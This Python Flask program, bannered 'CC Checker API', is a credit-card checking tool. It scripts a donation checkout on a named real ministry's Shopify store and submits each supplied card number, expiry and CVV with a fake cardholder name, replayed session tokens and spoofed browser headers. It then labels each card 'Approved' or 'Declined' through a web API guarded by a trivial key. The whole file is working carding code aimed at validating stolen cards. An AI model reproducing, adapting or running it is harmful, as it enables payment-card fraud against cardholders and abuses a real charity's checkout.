from flask import Flask, request, jsonify, Response
import requests, re, json, pyfiglet
from colorama import Fore, Style, init

# Initialize colorama
init()

app = Flask(__name__)

def check_card(ccx):
    # Parse card details
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except:
        return {
            "status": "Invalid Format 🚫",
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV"
        }

    r = requests.session()
    response_data = {}
    
    try:
        # Step 1: Add to cart - FIXED UTF-8 ENCODING
        headers = {
            'authority': 'wiredministries.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
            'origin': 'https://wiredministries.com',
            'referer': 'https://wiredministries.com/products/donate',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }
        
        # Create the form data with proper encoding
        boundary = "----WebKitFormBoundaryvtMfMS7ihgPqCSmW"
        form_data = [
            f'--{boundary}',
            'Content-Disposition: form-data; name="form_type"',
            '',
            'product',
            f'--{boundary}',
            'Content-Disposition: form-data; name="utf8"',
            '',
            '✓',  # This will be properly encoded
            f'--{boundary}',
            'Content-Disposition: form-data; name="id"',
            '',
            '6889401221181',
            f'--{boundary}',
            'Content-Disposition: form-data; name="quantity"',
            '',
            '1',
            f'--{boundary}',
            'Content-Disposition: form-data; name="add"',
            '',
            '',
            f'--{boundary}',
            'Content-Disposition: form-data; name="product-id"',
            '',
            '516727406653',
            f'--{boundary}',
            'Content-Disposition: form-data; name="section-id"',
            '',
            'product-template',
            f'--{boundary}--',
            ''
        ]
        data = '\r\n'.join(form_data).encode('utf-8')

        response = r.post('https://wiredministries.com/cart/add', 
                         cookies=r.cookies, 
                         headers=headers, 
                         data=data)

        # [Rest of your original code remains the same...]
        # Step 2: Proceed to checkout
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://wiredministries.com',
            'priority': 'u=0, i',
            'referer': 'https://wiredministries.com/cart',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        }
        
        data = {'updates[]': '2', 'note': '', 'checkout': 'Check out'}
        response = r.post('https://wiredministries.com/cart', headers=headers, data=data)

        # Step 3: Process payment
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopifycs.com',
            'priority': 'u=1, i',
            'referer': 'https://checkout.shopifycs.com/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        }
        
        json_data = {
            'credit_card': {
                'number': n,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': 'Tome Annder',
            },
            'payment_session_scope': 'wiredministries.com',
        }
        
        session_response = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data)
        iddd = session_response.json()['id']

        # Step 4: Verify payment
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': 'https://wiredministries.com',
            'priority': 'u=1, i',
            'referer': 'https://wiredministries.com/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',
            'x-checkout-web-build-id': iddd,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': 'Z2NwLWV1cm9wZS13ZXN0MTowMUo2NVlXVlhRQVI0QUtOWEM4VlBaTTJIWQ',
        }
        
        params = {'operationName': 'PollForReceipt',}
        
        json_data = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt...}',
            'variables': {
                'receiptId': 'gid://shopify/ProcessedReceipt/1505710342338',
                'sessionToken': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',
            },
            'operationName': 'PollForReceipt',
        }
        
        response = r.post('https://wiredministries.com/checkouts/unstable/graphql', params=params, cookies=r.cookies, headers=headers, json=json_data)
        text = response.text
        
        if 'Payment method successfully added.' in text:
            return {
                "status": "Approved ✅",
                "response": "Payment Successfully"
            }
        elif 'risk_threshold' in text:
            return {
                "status": "Declined 🚫",
                "response": "Card triggered risk threshold"
            }
        else:
            # Try to extract error message
            pattern = r'<div class="woocommerce-message".*?>(.*?)</div>'
            match = re.search(pattern, text)
            error_msg = match.group(1) if match else "Error:Generic_Decline"
            
            return {
                "status": "Declined 🚫",
                "response": error_msg
            }
            
    except Exception as e:
        return {
            "status": "Error ❌",
            "response": str(e)
        }

@app.route('/stripe0.2/key=<key>/cc=<cc>')
def process_cc(key, cc):
    if key != "void":
        response_data = {
            "error": "Invalid key",
            "status": "Unauthorized 🚫"
        }
        json_str = json.dumps(response_data, ensure_ascii=False)
        return Response(
            response=json_str,
            status=401,
            mimetype='application/json; charset=utf-8'
        )
    
    result = check_card(cc)
    
    response_data = {
        "cc": cc,
        "status": result["status"],
        "response": result["response"]
    }
    
    json_str = json.dumps(response_data, ensure_ascii=False)
    return Response(
        response=json_str,
        status=200,
        mimetype='application/json; charset=utf-8'
    )

if __name__ == '__main__':
    # Print banner
    banner = pyfiglet.figlet_format("CC Checker API")
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print(Fore.GREEN + "[*] Server running on port 7777" + Style.RESET_ALL)
    
    app.run(host='0.0.0.0', port=7777)

    # Example usage: http://127.0.0.1:7777/key=void/cc=4111111111111111|12|25|123

